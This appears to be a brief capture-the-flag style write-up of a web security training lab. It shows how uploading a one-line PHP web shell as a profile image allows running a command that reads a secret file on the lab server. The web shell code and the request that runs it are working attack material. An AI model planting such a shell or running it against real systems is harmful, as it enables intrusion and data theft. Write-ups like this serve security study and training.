# [Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)

## Steps

- Went to the login page, and logged in with provided credentials from the lab description (wiener:peter).
- On the my account page uploaded simple `image.php` file instead of actual profile image.

![1779138462618](image/01_Remote_code_execution_via_web_shell_upload/1779138462618.png)

`image.php`:

```php
<?php system($_GET['cmd']); ?>
```

- Opened url `https://0a2a007a03ea97f381e9cf7200cd0086.web-security-academy.net/files/avatars/image.php?cmd=cat%20/home/carlos/secret` to run the `cat /home/carlos/secret` command and obtain the secret flag.
